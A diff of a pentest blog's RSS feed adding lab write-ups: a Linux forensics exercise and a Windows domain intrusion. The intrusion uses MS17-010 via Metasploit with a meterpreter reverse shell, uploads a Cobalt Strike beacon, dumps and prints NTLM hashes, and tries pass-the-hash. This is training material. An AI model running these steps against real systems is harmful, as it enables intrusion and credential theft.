@@ -1,62 +1,303 @@
-<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[C1trus ]]></title><description><![CDATA[Obsidian digital garden]]></description><link>https://www.c1trus.top/</link><image><url>https://www.c1trus.top/lib/media/favicon.png</url><title>C1trus </title><link>https://www.c1trus.top/</link></image><generator>Webpage HTML Export plugin for Obsidian</generator><lastBuildDate>Sat, 28 Dec 2024 16:54:05 GMT</lastBuildDate><atom:link href="https://www.c1trus.top/lib/rss.xml" rel="self" type="application/rss+xml"/><pubDate>Sat, 28 Dec 2024 16:54:04 GMT</pubDate><copyright><![CDATA[C1trus]]></copyright><ttl>60</ttl><dc:creator>C1trus</dc:creator><item><title><![CDATA[4.Hosting]]></title><description><![CDATA[ 
+<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[C1trus ]]></title><description><![CDATA[Obsidian digital garden]]></description><link>https://www.c1trus.top/</link><image><url>https://www.c1trus.top/lib/media/favicon.png</url><title>C1trus </title><link>https://www.c1trus.top/</link></image><generator>Webpage HTML Export plugin for Obsidian</generator><lastBuildDate>Sat, 28 Dec 2024 16:56:35 GMT</lastBuildDate><atom:link href="https://www.c1trus.top/lib/rss.xml" rel="self" type="application/rss+xml"/><pubDate>Sat, 28 Dec 2024 16:56:29 GMT</pubDate><copyright><![CDATA[C1trus]]></copyright><ttl>60</ttl><dc:creator>C1trus</dc:creator><item><title><![CDATA[9.Binary Trail]]></title><description><![CDATA[ 
  <br><br>
 <br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
-<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a><br>
-- <a data-tooltip-position="top" aria-label="2.1. 端口扫描" data-href="#2.1. 端口扫描" href="https://www.c1trus.top/about:blank#2.1._端口扫描" class="internal-link" target="_self" rel="noopener nofollow">2.1. 端口扫描</a><br>
-- <a data-tooltip-position="top" aria-label="2.2. 目录扫描" data-href="#2.2. 目录扫描" href="https://www.c1trus.top/about:blank#2.2._目录扫描" class="internal-link" target="_self" rel="noopener nofollow">2.2. 目录扫描</a><br>
-靶机链接<br>
+<br><a data-tooltip-position="top" aria-label="2. 可疑二进制文件的名称是什么？" data-href="#2. 可疑二进制文件的名称是什么？" href="https://www.c1trus.top/about:blank#2._可疑二进制文件的名称是什么？" class="internal-link" target="_self" rel="noopener nofollow">2. 可疑二进制文件的名称是什么？</a>
+<br><a data-tooltip-position="top" aria-label="3. 二进制文件在系统中隐藏了哪个文件？" data-href="#3. 二进制文件在系统中隐藏了哪个文件？" href="https://www.c1trus.top/about:blank#3._二进制文件在系统中隐藏了哪个文件？" class="internal-link" target="_self" rel="noopener nofollow">3. 二进制文件在系统中隐藏了哪个文件？</a>
+<br><a data-tooltip-position="top" aria-label="4. 二进制文件在系统日志中留下了哪些命令的痕迹？" data-href="#4. 二进制文件在系统日志中留下了哪些命令的痕迹？" href="https://www.c1trus.top/about:blank#4._二进制文件在系统日志中留下了哪些命令的痕迹？" class="internal-link" target="_self" rel="noopener nofollow">4. 二进制文件在系统日志中留下了哪些命令的痕迹？</a>
+<br><a data-tooltip-position="top" aria-label="5. 在哪个日志文件中发现了这些痕迹？（路径）" data-href="#5. 在哪个日志文件中发现了这些痕迹？（路径）" href="https://www.c1trus.top/about:blank#5._在哪个日志文件中发现了这些痕迹？（路径）" class="internal-link" target="_self" rel="noopener nofollow">5. 在哪个日志文件中发现了这些痕迹？（路径）</a>
+<br><a data-tooltip-position="top" aria-label="6. 隐藏文件 /etc/.shadow_auth 的权限是多少？（数字形式）" data-href="#6. 隐藏文件 /etc/.shadow_auth 的权限是多少？（数字形式）" href="https://www.c1trus.top/about:blank#6._隐藏文件_/etc/.shadow_auth_的权限是多少？（数字形式）" class="internal-link" target="_self" rel="noopener nofollow">6. 隐藏文件 /etc/.shadow_auth 的权限是多少？（数字形式）</a><br>
+靶机链接 <a rel="noopener nofollow" class="external-link" href="https://thehackerslabs.com/binary-trail/" target="_blank">https://thehackerslabs.com/binary-trail/</a><br>
 难度 ⭐️⭐️️
-<br><br><br>┌──(root㉿kali)-[~/Desktop/vulnyx/Hosting]
-└─# nmap 192.168.56.21 -sCV
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-23 03:54 EST
-Nmap scan report for 192.168.56.21
-Host is up (0.00069s latency).
-Not shown: 996 filtered tcp ports (no-response)
-PORT    STATE SERVICE    VERSION
-80/tcp  open  tcpwrapped
-|_http-title: IIS Windows
-| http-methods:
-|_  Potentially risky methods: TRACE
-|_http-server-header: Microsoft-IIS/10.0
-135/tcp open  tcpwrapped
-139/tcp open  tcpwrapped
-445/tcp open  tcpwrapped
+<br><br>使用 find 命令搜索非标准目录中的可疑二进制文件 且修改时间大于2024-12-20<br>root@oscar:~# find / -type f -executable -not -path "/bin/*" -not -path "/usr/*" -not -path "/sbin/*" -newermt 2024-12-20 2&gt;/dev/null
+/etc/grub.d/01_password
+/etc/grub.d/10_linux
+/opt/auth_proxy
+<br>
+/etc/grub.d/ 是 GRUB 引导加载程序的配置脚本目录 10_linux 通常负责加载 Linux 内核 所以基本可以排除上面两个<br>
+/opt 一般是第三方程序的安装目录，所以这个可疑程序就是 auth_proxy
+<br><br>利用 strings 命令进行提取 含有 / 的字符串。一般文件都会与这个有关<br>root@oscar:~# strings /opt/auth_proxy | grep "/"
+/lib64/ld-linux-x86-64.so.2
+touch /etc/.shadow_auth
 
-Host script results:
-| smb2-time:
-|   date: 2024-12-23T14:54:55
-|_  start_date: N/A
-| smb2-security-mode:
-|   3:1:1:
-|_    Message signing enabled but not required
-|_clock-skew: 5h59m58s
-|_nbstat: NetBIOS name: HOSTING, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:46:6d:91 (Oracle VirtualBox virtual NIC)
+<br>/etc/.shadow_auth<br><br>查看系统日志即可<br>root@oscar:~# strings /var/log/auth.log.1 | grep "auth_proxy"
+Dec 21 10:32:45 server auth_proxy: touch /etc/.shadow_auth
+Dec 21 10:32:45 server auth_proxy: Probando creaci
+Dec 21 10:32:45 server auth_proxy: touch /etc/.shadow_auth
+Dec 21 10:32:45 server auth_proxy: Probando creaci
+Dec 21 10:32:45 server auth_proxy: touch /etc/.shadow_auth
+Dec 21 10:32:45 server auth_proxy: Probando creaci
 
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 25.36 seconds
+<br>touch<br>
+上面执行 strings /opt/auth_proxy | grep "/" 时就给出了这个命令<br><br>我们在 /var/log/auth.log.1 里面发现了痕迹，但因为日志文件的轮转机制，所以其实是日志文件 /var/log/auth.log 这里面的内容<br><br>root@oscar:~# stat -c "%a" /etc/.shadow_auth
+600
 
-<br><br>┌──(root㉿kali)-[~/Desktop/vulnyx/Hosting]
-└─# gobuster dir -u http://192.168.56.21/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,zip
-===============================================================
-Gobuster v3.6
-by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
-===============================================================
-[+] Url:                     http://192.168.56.21/
-[+] Method:                  GET
-[+] Threads:                 10
-[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-[+] Negative Status codes:   404
-[+] User Agent:              gobuster/3.6
-[+] Extensions:              txt,zip,html
-[+] Timeout:                 10s
-===============================================================
-Starting gobuster in directory enumeration mode
-===============================================================
-/speed                (Status: 301) [Size: 161] [--&gt; http://192.168.56.21/speed/]
+<br>600]]></description><link>https://www.c1trus.top/24-渗透/thl/9.binary-trail.html</link><guid isPermaLink="false">24-渗透/THL/9.Binary Trail.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:47 GMT</pubDate></item><item><title><![CDATA[8.Milanesa]]></title><description><![CDATA[ 
+ <br><br>
+<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
+<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
+<br><a data-tooltip-position="top" aria-label="3. ms17-010" data-href="#3. ms17-010" href="https://www.c1trus.top/about:blank#3._ms17-010" class="internal-link" target="_self" rel="noopener nofollow">3. ms17-010</a>
+<br><a data-tooltip-position="top" aria-label="4. PTH" data-href="#4. PTH" href="https://www.c1trus.top/about:blank#4._PTH" class="internal-link" target="_self" rel="noopener nofollow">4. PTH</a>
 
-<br><img alt="assets/Pasted image 20241223165928.png" src="https://www.c1trus.top/24-渗透/vulnyx/assets/pasted-image-20241223165928.png"><br>
-继续对这个目录扫描<br>┌──(root㉿kali)-[~/Desktop/vulnyx/Hosting]
-└─# dirsearch -u http://192.168.56.21/speed
+<br><a data-tooltip-position="top" aria-label="4.1. mimikatz抓取域控hash" data-href="#4.1. mimikatz抓取域控hash" href="https://www.c1trus.top/about:blank#4.1._mimikatz抓取域控hash" class="internal-link" target="_self" rel="noopener nofollow">4.1. mimikatz抓取域控hash</a>
+
+
+<br><a data-tooltip-position="top" aria-label="5. 网站利用" data-href="#5. 网站利用" href="https://www.c1trus.top/about:blank#5._网站利用" class="internal-link" target="_self" rel="noopener nofollow">5. 网站利用</a><br>
+- <a data-tooltip-position="top" aria-label="5.1. 目录扫描" data-href="#5.1. 目录扫描" href="https://www.c1trus.top/about:blank#5.1._目录扫描" class="internal-link" target="_self" rel="noopener nofollow">5.1. 目录扫描</a><br>
+- <a data-tooltip-position="top" aria-label="5.2. 登录框利用" data-href="#5.2. 登录框利用" href="https://www.c1trus.top/about:blank#5.2._登录框利用" class="internal-link" target="_self" rel="noopener nofollow">5.2. 登录框利用</a><br>
+靶机链接<br>
+难度 ⭐️⭐️⭐️️
+<br><br>┌──(root㉿kali)-[~]
+└─# fscan -h 20.20.20.0/24
+
+   ___                              _
+  / _ \     ___  ___ _ __ __ _  ___| | __
+ / /_\/____/ __|/ __| '__/ _`' |/ __| |/ /
+/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;
+\____/     |___/\___|_|  \__,_|\___|_|\_\
+                     fscan version: 2.0.0
+[*] 扫描类型: all, 目标端口: 21,22,80,81,135,139,443,445,1433,1521,3306,5432,6379,7001,8000,8080,8089,9000,9200,11211,27017,80,81,82,83,84,85,86,87,88,89,90,91,92,98,99,443,800,801,808,880,888,889,1000,1010,1080,1081,1082,1099,1118,1888,2008,2020,2100,2375,2379,3000,3008,3128,3505,5555,6080,6648,6868,7000,7001,7002,7003,7004,7005,7007,7008,7070,7071,7074,7078,7080,7088,7200,7680,7687,7688,7777,7890,8000,8001,8002,8003,8004,8006,8008,8009,8010,8011,8012,8016,8018,8020,8028,8030,8038,8042,8044,8046,8048,8053,8060,8069,8070,8080,8081,8082,8083,8084,8085,8086,8087,8088,8089,8090,8091,8092,8093,8094,8095,8096,8097,8098,8099,8100,8101,8108,8118,8161,8172,8180,8181,8200,8222,8244,8258,8280,8288,8300,8360,8443,8448,8484,8800,8834,8838,8848,8858,8868,8879,8880,8881,8888,8899,8983,8989,9000,9001,9002,9008,9010,9043,9060,9080,9081,9082,9083,9084,9085,9086,9087,9088,9089,9090,9091,9092,9093,9094,9095,9096,9097,9098,9099,9100,9200,9443,9448,9800,9981,9986,9988,9998,9999,10000,10001,10002,10004,10008,10010,10250,12018,12443,14000,16080,18000,18001,18002,18004,18008,18080,18082,18088,18090,18098,19001,20000,20720,21000,21501,21502,28018,20880
+[*] 开始信息扫描...
+[*] CIDR范围: 20.20.20.0-20.20.20.255
+[*] 已生成IP范围: 20.20.20.0 - 20.20.20.255
+[*] 已解析CIDR 20.20.20.0/24 -&gt; IP范围 20.20.20.0-20.20.20.255
+[*] 最终有效主机数量: 256
+[+] 目标 20.20.20.1      存活 (ICMP)
+[+] 目标 20.20.20.7      存活 (ICMP)
+[+] 目标 20.20.20.4      存活 (ICMP)
+[+] 目标 20.20.20.2      存活 (ICMP)
+[+] 目标 20.20.20.6      存活 (ICMP)
+[+] 目标 20.20.20.3      存活 (ICMP)
+[+] 目标 20.20.20.5      存活 (ICMP)
+[+] ICMP存活主机数量: 7
+[*] 共解析 218 个有效端口
+[+] 端口开放 20.20.20.7:22
+[+] 端口开放 20.20.20.3:80
+[+] 端口开放 20.20.20.6:80
+[+] 端口开放 20.20.20.6:139
+[+] 端口开放 20.20.20.5:139
+[+] 端口开放 20.20.20.5:135
+[+] 端口开放 20.20.20.4:135
+[+] 端口开放 20.20.20.4:139
+[+] 端口开放 20.20.20.6:445
+[+] 端口开放 20.20.20.3:443
+[+] 端口开放 20.20.20.3:139
+[+] 端口开放 20.20.20.3:135
+[+] 端口开放 20.20.20.1:135
+[+] 端口开放 20.20.20.6:135
+[+] 端口开放 20.20.20.1:139
+[+] 端口开放 20.20.20.4:445
+[+] 端口开放 20.20.20.5:445
+[+] 端口开放 20.20.20.3:445
+[+] 端口开放 20.20.20.1:445
+[+] 端口开放 20.20.20.4:88
+[+] 端口开放 20.20.20.3:3306
+[+] 端口开放 20.20.20.1:7680
+[+] 端口开放 20.20.20.1:7890
+[+] 端口开放 20.20.20.6:3306
+[+] 端口开放 20.20.20.5:8080
+[+] 存活端口数量: 25
+[*] 开始漏洞扫描...
+[!] 扫描错误 20.20.20.1:445 - read tcp 20.20.20.7:34666-&gt;20.20.20.1:445: read: connection reset by peer
+[!] 扫描错误 20.20.20.6:445 - read tcp 20.20.20.7:34600-&gt;20.20.20.6:445: read: connection reset by peer
+[!] 扫描错误 20.20.20.3:445 - read tcp 20.20.20.7:58318-&gt;20.20.20.3:445: read: connection reset by peer
+[*] NetInfo
+[*] 20.20.20.1
+   [-&gt;] yu
+   [-&gt;] 192.168.1.1
+   [-&gt;] 192.168.8.1
+   [-&gt;] 192.168.56.1
+   [-&gt;] 10.16.9.188
+   [-&gt;] 10.10.10.1
+   [-&gt;] 20.20.20.1
+   [-&gt;] 30.30.30.1
+   [-&gt;] 2409:8760:1e81:10::2:6dc6
+[!] 扫描错误 20.20.20.5:445 - read tcp 20.20.20.7:57976-&gt;20.20.20.5:445: read: connection reset by peer
+[*] NetBios 20.20.20.1      WORKGROUP\YU
+[*] NetInfo
+[*] 20.20.20.5
+   [-&gt;] Milanesa1
+   [-&gt;] 30.30.30.5
+   [-&gt;] 10.10.10.5
+   [-&gt;] 20.20.20.5
+   [-&gt;] 192.168.56.112
+[*] NetBios 20.20.20.3      HACKME\WIN-SEUNA992K57
+[*] NetInfo
+[*] 20.20.20.3
+   [-&gt;] WIN-SEUNA992K57
+   [-&gt;] 192.168.56.11
+   [-&gt;] 10.10.10.3
+   [-&gt;] 20.20.20.3
+   [-&gt;] 30.30.30.3
+[!] 扫描错误 20.20.20.1:7680 - Get "https://20.20.20.1:7680": EOF
+[*] 网站标题 http://20.20.20.6         状态码:503 长度:326    标题:Service Unavailable
+[*] NetInfo
+[*] 20.20.20.6
+   [-&gt;] WIN-11ULVN883E8
+   [-&gt;] 192.168.56.12
+   [-&gt;] 10.10.10.6
+   [-&gt;] 20.20.20.6
+   [-&gt;] 30.30.30.6
+[*] NetBios 20.20.20.6      WORKGROUP\WIN-11ULVN883E8
+[*] NetInfo
+[*] 20.20.20.4
+   [-&gt;] WIN-M5KV71CEGO8
+   [-&gt;] 30.30.30.6
+   [-&gt;] 20.20.20.4
+   [-&gt;] 30.30.30.4
+   [-&gt;] 10.10.10.4
+[!] 扫描错误 20.20.20.4:88 - Get "http://20.20.20.4:88": read tcp 20.20.20.7:60944-&gt;20.20.20.4:88: read: connection reset by peer
+[*] 网站标题 https://20.20.20.3        状态码:302 长度:0      标题:无标题 重定向地址: https://20.20.20.3/dashboard/
+[*] NetBios 20.20.20.5      WORKGROUP\MILANESA1
+[*] 网站标题 http://20.20.20.3         状态码:302 长度:0      标题:无标题 重定向地址: http://20.20.20.3/dashboard/
+[*] 网站标题 http://20.20.20.5:8080    状态码:200 长度:4755   标题:Milanesas Argentinas
+[+] MS17-010 20.20.20.4 (Windows Server 2016 Standard 14393)
+[*] NetBios 20.20.20.4      [+] DC:WIN-M5KV71CEGO8.hackme.thl      Windows Server 2016 Standard 14393
+[*] 网站标题 http://20.20.20.1:7890    状态码:400 长度:0      标题:无标题
+[*] 网站标题 http://20.20.20.3/dashboard/ 状态码:200 长度:5187   标题:Welcome to XAMPP
+[!] 扫描错误 20.20.20.1:7890 - Get "https://20.20.20.1:7890": EOF
+[*] 网站标题 https://20.20.20.3/dashboard/ 状态码:200 长度:5187   标题:Welcome to XAMPP
+[!] 扫描错误 20.20.20.3:3306 - Error 1045 (28000): Access denied for user 'mysql'@'20.20.20.7' (using password: YES)
+[!] 扫描错误 20.20.20.6:3306 - Error 1045 (28000): Access denied for user 'mysql'@'20.20.20.7' (using password: YES)
+[!] 扫描错误 20.20.20.7:22 - 扫描总时间超时: context deadline exceeded
+[+] 扫描已完成: 25/25
+[*] 扫描结束,耗时: 12.122585738s
+
+
+<br>整理一下<br>20.20.20.3  HACKME\WIN-SEUNA992K57  开放端口 80 135 139 443 445 3306
+20.20.20.4  WIN-M5KV71CEGO8 开放端口 53 88 135 139 389 445 464 593 636 3268 3269 
+20.20.20.5  Milanesa1 开放端口 135 139 445 3389 8080
+20.20.20.6  WIN-11ULVN883E8 开放端口 80 135 139 445 3306
+ 
+ 域名 hackme.thl
+ DC  20.20.20.4  WIN-M5KV71CEGO8.hackme.thl
+<br><br>fscan扫描出域控主机 存在ms17-010<br>
+先配置hosts<br>msfconsole
+msf6 &gt; use exploit/windows/smb/ms17_010_psexec
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf6 exploit(windows/smb/ms17_010_psexec) &gt; show options
+
+Module options (exploit/windows/smb/ms17_010_psexec):
+
+   Name                  Current Setting              Required  Description
+   ----                  ---------------              --------  -----------
+   DBGTRACE              false                        yes       Show extra debug trace info
+   LEAKATTEMPTS          99                           yes       How many times to try to leak transaction
+   NAMEDPIPE                                          no        A named pipe that can be connected to (leave b
+                                                                lank for auto)
+   NAMED_PIPES           /usr/share/metasploit-frame  yes       List of named pipes to check
+                         work/data/wordlists/named_p
+                         ipes.txt
+   RHOSTS                                             yes       The target host(s), see https://docs.metasploi
+                                                                t.com/docs/using-metasploit/basics/using-metas
+                                                                ploit.html
+   RPORT                 445                          yes       The Target port (TCP)
+   SERVICE_DESCRIPTION                                no        Service description to be used on target for p
+                                                                retty listing
+   SERVICE_DISPLAY_NAME                               no        The service display name
+   SERVICE_NAME                                       no        The service name
+   SHARE                 ADMIN$                       yes       The share to connect to, can be an admin share
+                                                                 (ADMIN$,C$,...) or a normal read/write folder
+                                                                 share
+   SMBDomain             .                            no        The Windows domain to use for authentication
+   SMBPass                                            no        The password for the specified username
+   SMBUser                                            no        The username to authenticate as
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.8.96     yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(windows/smb/ms17_010_psexec) &gt; set lhost 20.20.20.7
+lhost =&gt; 20.20.20.7
+msf6 exploit(windows/smb/ms17_010_psexec) &gt; set rhosts 20.20.20.4
+rhosts =&gt; 20.20.20.4
+msf6 exploit(windows/smb/ms17_010_psexec) &gt; run
+
+[*] Started reverse TCP handler on 20.20.20.7:4444
+[*] 20.20.20.4:445 - Target OS: Windows Server 2016 Standard 14393
+[*] 20.20.20.4:445 - Built a write-what-where primitive...
+[+] 20.20.20.4:445 - Overwrite complete... SYSTEM session obtained!
+[*] 20.20.20.4:445 - Selecting PowerShell target
+[*] 20.20.20.4:445 - Executing the payload...
+[+] 20.20.20.4:445 - Service start timed out, OK if running a command or non-service executable...
+[*] Sending stage (176198 bytes) to 20.20.20.4
+[*] Meterpreter session 1 opened (20.20.20.7:4444 -&gt; 20.20.20.4:49705) at 2024-12-21 00:44:46 -0500
+
+meterpreter &gt; getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter &gt; shell
+Process 1592 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;whoami
+whoami
+nt authority\system
+
+
+c:\Users\Administrator\Documents&gt;type root_flag.txt
+type root_flag.txt
+{5de4808fa7cec46234dbccc6c46fa6c84}
+
+<br>拿下，这里我们传一个cs的后面并运行。方便后续利用<br>meterpreter &gt; upload 3333.exe
+[*] Uploading  : /root/Desktop/thl/Milanesa/3333.exe -&gt; 3333.exe
+[*] Uploaded 289.00 KiB of 289.00 KiB (100.0%): /root/Desktop/thl/Milanesa/3333.exe -&gt; 3333.exe
+[*] Completed  : /root/Desktop/thl/Milanesa/3333.exe -&gt; 3333.exe
+meterpreter &gt; shell
+Process 1596 created.
+Channel 2 created.
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+C:\Windows\system32&gt;3333.exe
+3333.exe
+
+<br><img alt="assets/Pasted image 20241221135649.png" src="https://www.c1trus.top/24-渗透/thl/assets/pasted-image-20241221135649.png"><br><br>利用CS模块查看一下域内的主机<br>[12/21 14:01:39] [+] =========== 查询域主机 ==========
+[12/21 14:01:39] [*] Tasked beacon to run: dsquery computer
+[12/21 14:01:39] [+] host called home, sent: 47 bytes
+[12/21 14:01:39] [+] received output:
+"CN=WIN-M5KV71CEGO8,OU=Domain Controllers,DC=hackme,DC=thl"
+"CN=WIN-SEUNA992K57,OU=Application,OU=Tier 1 Servers,DC=hackme,DC=thl"
+
+<br>可以发现除了DC WIN-M5KV71CEGO8 外 还有一台主机 WIN-SEUNA992K57 也在域内<br>
+WIN-SEUNA992K57对应的ip是 20.20.20.3 <br>尝试使用域控的hash直接连接 这台主机<br><br>[12/21 14:05:00] beacon&gt; hashdump
+[12/21 14:05:00] [*] Tasked beacon to dump hashes
+[12/21 14:05:00] [+] host called home, sent: 82541 bytes
+[12/21 14:05:01] [+] received password hashes:
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:6fda56fabbfce076170e240be62db1bc:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8e6213105200de353a368062c3af0f94:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+adm_tier1:1128:aad3b435b51404eeaad3b435b51404ee:064dca142a74133d10a594683e6e9470:::
+jenkins:1131:aad3b435b51404eeaad3b435b51404ee:cb8a428385459087a76793010d60f5dc:::
+tier0_adm:1135:aad3b435b51404eeaad3b435b51404ee:b6641f2580ced2aa557daa2d1ef0aa23:::
+WIN-M5KV71CEGO8$:1000:aad3b435b51404eeaad3b435b51404ee:54bebe11da7a6447eab05ed3dea7a453:::
+WIN-SEUNA992K57$:1136:aad3b435b51404eeaad3b435b51404ee:5142662655fe8cce534e074112e50e1d::
+<br>然后尝试使用域控的HASH 直接pth 但是发现不行<br><br>先看下现在的信息<br>20.20.20.3  HACKME\WIN-SEUNA992K57  开放端口 80 135 139 443 445 3306
+20.20.20.4 【已拿下】 WIN-M5KV71CEGO8 开放端口 53 88 135 139 389 445 464 593 636 3268 3269 
+20.20.20.5  Milanesa1 开放端口 135 139 445 3389 8080
+20.20.20.6  WIN-11ULVN883E8 开放端口 80 135 139 445 3306
+ 
+ 域名 hackme.thl
+ DC  20.20.20.4  WIN-M5KV71CEGO8.hackme.thl
+<br>我们发现另外3个主机都开放了网页服务。<br>
+对这几个都进行一下目录扫描<br><br>┌──(root㉿kali)-[~/Desktop/thl/Milanesa]
+└─# dirsearch -u http://20.20.20.3
 /usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
   from pkg_resources import DistributionNotFound, VersionConflict
 
@@ -65,107 +306,623 @@ Starting gobuster in directory enumeration mode
 
 Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
 
-Output File: /root/Desktop/vulnyx/Hosting/reports/http_192.168.56.21/_speed_24-12-23_04-02-31.txt
+Output File: /root/Desktop/thl/Milanesa/reports/http_20.20.20.3/_24-12-21_01-55-52.txt
 
-Target: http://192.168.56.21/
+Target: http://20.20.20.3/
 
-[04:02:31] Starting: speed/
-[04:02:31] 301 -  164B  - /speed/js  -&gt;  http://192.168.56.21/speed/js/
-[04:02:31] 403 -  312B  - /speed/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
-[04:02:33] 403 -  312B  - /speed/\..\..\..\..\..\..\..\..\..\etc\passwd
-[04:02:37] 403 -  312B  - /speed/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
-[04:02:38] 301 -  165B  - /speed/css  -&gt;  http://192.168.56.21/speed/css/
-[04:02:40] 301 -  167B  - /speed/fonts  -&gt;  http://192.168.56.21/speed/fonts/
-[04:02:41] 301 -  168B  - /speed/images  -&gt;  http://192.168.56.21/speed/images/
-[04:02:41] 403 -    1KB - /speed/images/
-[04:02:41] 403 -    1KB - /speed/js/
+[01:55:52] Starting:
+
+[01:56:01] 301 -  336B  - /dashboard  -&gt;  http://20.20.20.3/dashboard/
+[01:56:01] 200 -    5KB - /dashboard/
+[01:56:01] 200 -   31KB - /dashboard/faq.html
+[01:56:01] 200 -   80KB - /dashboard/phpinfo.php
+[01:56:01] 200 -    6KB - /dashboard/howto.html
+[01:56:01] 302 -    0B  - /dvwa/  -&gt;  login.php
+[01:56:02] 200 -   30KB - /favicon.ico
+[01:56:13] 200 -  776B  - /Webalizer/
+[01:56:14] 200 -  768B  - /xampp/
+
+
+┌──(root㉿kali)-[~/Desktop/thl/Milanesa]
+└─# dirsearch -u http://20.20.20.5:8080
+/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
+
+Output File: /root/Desktop/thl/Milanesa/reports/http_20.20.20.5_8080/_24-12-21_01-56-22.txt
+
+Target: http://20.20.20.5:8080/
+
+[01:56:22] Starting:
+
+[01:56:36] 200 -    1KB - /login.aspx
+
+
+┌──(root㉿kali)-[~/Desktop/thl/Milanesa]
+└─# dirsearch -u http://20.20.20.6
+/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
+
+Output File: /root/Desktop/thl/Milanesa/reports/http_20.20.20.6/_24-12-21_01-57-34.txt
+
+Target: http://20.20.20.6/
+
+[01:57:34] Starting:
 
 Task Completed
 
-<br>访问后查看源码没有感觉没有什么可以直接利用的点或者隐藏的提示信息<br>
-<img alt="assets/Pasted image 20241223170417.png" src="https://www.c1trus.top/24-渗透/vulnyx/assets/pasted-image-20241223170417.png"><br>
-在这里可以获取到4个人名<br>
-我们将它写入字典<br>我靶机现在有问题。使用正确的账号密码无法登录]]></description><link>https://www.c1trus.top/24-渗透/vulnyx/4.hosting.html</link><guid isPermaLink="false">24-渗透/Vulnyx/4.Hosting.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://www.c1trus.top/24-渗透/vulnyx/assets/pasted-image-20241223165928.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://www.c1trus.top/24-渗透/vulnyx/assets/pasted-image-20241223165928.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[3.Admin]]></title><description><![CDATA[ 
+
+<br><br>发现 20.20.20.5:8080 存在一个 /login.aspx<br>
+随便输入账号密码发现都可以登录，而且登录后都是一个报错界面<br>
+<img alt="assets/Pasted image 20241221150209.png" src="https://www.c1trus.top/24-渗透/thl/assets/pasted-image-20241221150209.png"><br>
+这可能就不是一个真的登录框<br>
+将报错信息发给gpt 告诉我 指定的文件路径或命令没有找到<br>
+<img alt="assets/Pasted image 20241221150320.png" src="https://www.c1trus.top/24-渗透/thl/assets/pasted-image-20241221150320.png"><br>
+经过尝试后 发现这里是一个命令执行的利用<br>
